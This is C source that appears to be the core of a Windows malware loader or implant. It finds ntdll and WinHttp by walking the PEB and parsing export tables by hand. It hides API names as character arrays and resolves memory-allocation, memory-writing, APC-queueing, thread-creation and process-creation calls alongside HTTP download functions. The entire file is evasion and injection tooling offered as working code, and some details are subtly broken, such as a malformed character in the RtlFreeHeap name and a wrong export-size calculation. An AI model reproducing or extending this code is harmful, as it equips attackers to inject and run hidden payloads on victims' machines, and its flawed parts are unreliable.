#include <windows.h>
#include <Common.h>
#include <Structs.h>
#include <Core/Win32.h>

PVOID LdrModuleAddr( _In_ LPWSTR ModuleName){

    PTEB                  pTeb  = __readgsqword(0x30);
    PLDR_DATA_TABLE_ENTRY Data  = { 0 };
    PLIST_ENTRY           Head  = { 0 };
    PLIST_ENTRY           Entry = { 0 };

    Head  = &pTeb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList;
    Entry = Head->Flink;

    for ( ; Head != Entry ; Entry = Entry->Flink ) {
        Data = C_PTR( Entry );
        if ( wCharCompare(Data->BaseDllName.Buffer, ModuleName ) == 0){
            return C_PTR(Data->DllBase);
        }
    }

    return NULL;
}

PVOID LdrFuncAddr( _In_ PVOID BaseModule, _In_ PCHAR FuncName ) {
    PIMAGE_NT_HEADERS       pImgNt          = { 0 };
    PIMAGE_EXPORT_DIRECTORY pImgExportDir   = { 0 };
    DWORD                   ExpDirSz        =  0x00;
    PDWORD                  AddrOfFuncs     = NULL;
    PDWORD                  AddrOfNames     = NULL;
    PWORD                   AddrOfOrdinals  = NULL;
    PVOID                   FuncAddr        = NULL;

    pImgNt          = C_PTR(BaseModule + ((PIMAGE_DOS_HEADER)BaseModule)->e_lfanew);
    pImgExportDir   = C_PTR(BaseModule + pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    ExpDirSz        = U_PTR(BaseModule + pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size);

    AddrOfNames     = C_PTR(BaseModule + pImgExportDir->AddressOfNames);
    AddrOfFuncs     = C_PTR(BaseModule + pImgExportDir->AddressOfFunctions);
    AddrOfOrdinals  = C_PTR(BaseModule + pImgExportDir->AddressOfNameOrdinals);

    for (int i = 0; i < pImgExportDir->NumberOfNames; i++) {

        PCHAR pFuncName = (PCHAR)(BaseModule + AddrOfNames[i]);
        PVOID pFunctionAddress = C_PTR(BaseModule + AddrOfFuncs[AddrOfOrdinals[i]]);
        
        if (StringCompareA(pFuncName, FuncName) == 0) {
            if ( (U_PTR(pFunctionAddress) >= U_PTR(pImgExportDir) ) &&
                 (U_PTR(pFunctionAddress) <  U_PTR(pImgExportDir) + ExpDirSz) ) {

                CHAR ForwarderName[MAX_PATH] = { 0 };
                DWORD dwOffset               = 0x00;
                PCHAR FuncMod                = NULL;
                PCHAR nwFuncName             = NULL;

                MemCopy( ForwarderName, pFunctionAddress, StringLengthA((PCHAR)pFunctionAddress) );

                for (int i = 0; i < StringLengthA( (PCHAR)ForwarderName ); i++) {
                    if (((PCHAR)ForwarderName)[i] == '.') {
                        dwOffset = i;
                        ForwarderName[i] = NULL;
                        break;
                    }
                }

                FuncMod = ForwarderName;
                nwFuncName = ForwarderName + dwOffset + 1;

            }
        
            return C_PTR(pFunctionAddress);
            
        }
    }

    return NULL;
}

PVOID LdrLib(  _In_ PINSTANCE Instance,  _In_ LPSTR ModuleName ){
    if ( ! ModuleName )
        return NULL;

    UNICODE_STRING  UnicodeString           = { 0 };
    WCHAR           ModuleNameW[ MAX_PATH ] = { 0 };
    DWORD           dwModuleNameSize        = StringLengthA( ModuleName );
    HMODULE         Module                  = NULL;

    CharStringToWCharString( ModuleNameW, ModuleName, dwModuleNameSize );

    if ( ModuleNameW ){
        USHORT DestSize             = StringLengthW( ModuleNameW ) * sizeof( WCHAR );
        UnicodeString.Length        = DestSize;
        UnicodeString.MaximumLength = DestSize + sizeof( WCHAR );
    }

    UnicodeString.Buffer = ModuleNameW;

    if ( Instance->Api.pLdrLoadDll( NULL, 0, &UnicodeString, &Module ) == 0 )
        return Module;
    else
        return NULL;
}

void InitInstance( _Out_ PINSTANCE pInstance ){

    pInstance->pTeb = NtCurrentTeb();

    /*--------------------------[ Ntdll ]--------------------------*/

    WCHAR  wNtdll[] = L"ntdll.dll";

    CHAR cNtCreateThreadEx[]             = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', 0 };
    CHAR cNtAllocateVirtualMemory[]      = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
    CHAR cNtProtectVirtualMemory[]       = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
    CHAR cNtWriteVirtualMemory[]         = { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
    CHAR cNtQueueApcThread[]             = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', 0 };
    CHAR cNtCreateUserProcess[]          = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'U', 's', 'e', 'r', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };
    CHAR cRtlCreateProcessParametersEx[] = { 'R', 't', 'l', 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'P', 'a', 'r', 'a', 'm', 'e', 't', 'e', 'r', 's', 'E', 'x', 0 };
    CHAR cLdrLoadDll[]                   = { 'L', 'd', 'r', 'L', 'o', 'a', 'd', 'D', 'l', 'l', 0 };

    CHAR cRtlAllocateHeap[]   = { 'R', 't', 'l', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'H', 'e', 'a', 'p', 0 };
    CHAR cRtlReAllocateHeap[] = { 'R', 't', 'l', 'R', 'e', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'H', 'e', 'a', 'p', 0 };
    CHAR cRtlFreeHeap[]       = { 'R', 't', 'l', 'F', 'r', 'e', 'e', 'H', 'e ', 'a', 'p', 0 };

    pInstance->Module.Ntdll          = LdrModuleAddr(wNtdll);

    pInstance->Api.pNtCreateThreadEx             = LdrFuncAddr(pInstance->Module.Ntdll, cNtCreateThreadEx);
    pInstance->Api.pNtAllocateVirtualMemory      = LdrFuncAddr(pInstance->Module.Ntdll, cNtAllocateVirtualMemory);
    pInstance->Api.pNtProtectVirtualMemory       = LdrFuncAddr(pInstance->Module.Ntdll, cNtProtectVirtualMemory);
    pInstance->Api.pNtWriteVirtualMemory         = LdrFuncAddr(pInstance->Module.Ntdll, cNtWriteVirtualMemory);
    pInstance->Api.pNtQueueApcThread             = LdrFuncAddr(pInstance->Module.Ntdll, cNtQueueApcThread);
    pInstance->Api.pNtCreateUserProcess          = LdrFuncAddr(pInstance->Module.Ntdll, cNtCreateUserProcess);
    pInstance->Api.pRtlCreateProcessParametersEx = LdrFuncAddr(pInstance->Module.Ntdll, cRtlCreateProcessParametersEx);
    pInstance->Api.pLdrLoadDll                   = LdrFuncAddr(pInstance->Module.Ntdll, cLdrLoadDll);

    pInstance->Api.pRtlAllocateHeap   = LdrFuncAddr(pInstance->Module.Ntdll, cRtlAllocateHeap);
    pInstance->Api.pRtlReAllocateHeap = LdrFuncAddr(pInstance->Module.Ntdll, cRtlReAllocateHeap);
    pInstance->Api.pRtlFreeHeap       = LdrFuncAddr(pInstance->Module.Ntdll, cRtlFreeHeap);

  /*--------------------------[ WinHttp ]--------------------------*/

    LPWSTR          wWinHttp   = "WinHttp.dll";
    PUNICODE_STRING usWinHttp  = { 0 };
    CHAR            cWinHttp[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', '.', 'd', 'l', 'l', 0};

    CHAR cWinHttpOpen[]            = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 0 };
    CHAR cWinHttpConnect[]         = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'o', 'n', 'n', 'e', 'c', 't', 0 };
    CHAR cWinHttpOpenRequest[]     = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 'R', 'e', 'q', 'u', 'e', 's', 't', 0 };
    CHAR cWinHttpReadData[]        = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'a', 'd', 'D', 'a', 't', 'a', 0 };
    CHAR cWinHttpReceiveResponse[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'c', 'e', 'i', 'v', 'e', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', 0 };
    CHAR cWinHttpSendRequest[]     = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 'n', 'd', 'R', 'e', 'q', 'u', 'e', 's', 't', 0 };
    CHAR cWinHttpQueryHeaders[]    = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'H', 'e', 'a', 'd', 'e', 'r', 's', 0 };
    CHAR cWinHttpCloseHandle[]     = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };

    pInstance->Module.WinHttp = LdrModuleAddr( cWinHttp );
    if ( !pInstance->Module.WinHttp ){
        InitUnicodeString( &usWinHttp, wWinHttp );
        pInstance->Module.WinHttp = LdrLib( pInstance, cWinHttp );
    }
    pInstance->Api.pWinHttpOpen            = LdrFuncAddr(pInstance->Module.WinHttp, cWinHttpOpen);
    pInstance->Api.pWinHttpConnect         = LdrFuncAddr(pInstance->Module.WinHttp, cWinHttpConnect);
    pInstance->Api.pWinHttpOpenRequest     = LdrFuncAddr(pInstance->Module.WinHttp, cWinHttpOpenRequest);
    pInstance->Api.pWinHttpReadData        = LdrFuncAddr(pInstance->Module.WinHttp, cWinHttpReadData);
    pInstance->Api.pWinHttpReceiveResponse = LdrFuncAddr(pInstance->Module.WinHttp, cWinHttpReceiveResponse);
    pInstance->Api.pWinHttpSendRequest     = LdrFuncAddr(pInstance->Module.WinHttp, cWinHttpSendRequest);
    pInstance->Api.pWinHttpQueryHeaders    = LdrFuncAddr(pInstance->Module.WinHttp, cWinHttpQueryHeaders);
    pInstance->Api.pWinHttpCloseHandle     = LdrFuncAddr(pInstance->Module.WinHttp, cWinHttpCloseHandle);

}

